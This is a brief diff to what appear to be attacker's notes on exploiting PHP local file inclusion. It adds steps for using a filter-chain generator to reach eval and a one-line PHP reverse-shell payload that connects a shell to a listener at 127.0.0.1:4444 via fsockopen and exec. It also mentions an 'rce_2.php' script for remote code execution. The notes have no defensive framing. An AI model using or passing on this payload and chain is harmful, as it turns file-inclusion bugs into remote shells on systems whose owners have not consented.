@@ -1,4 +1,7 @@
 - PHP LFI
+    - Use https://github.com/synacktiv/php_filter_chain_generator to perform an eval
+    - get reverse shell: $sock=fsockopen("127.0.0.1",4444);exec("/proc/self/exe -a <&3 >&3 2>&3");
+    - Use rce_2.php to get RCE
     - DDexec
     - shellcode
 
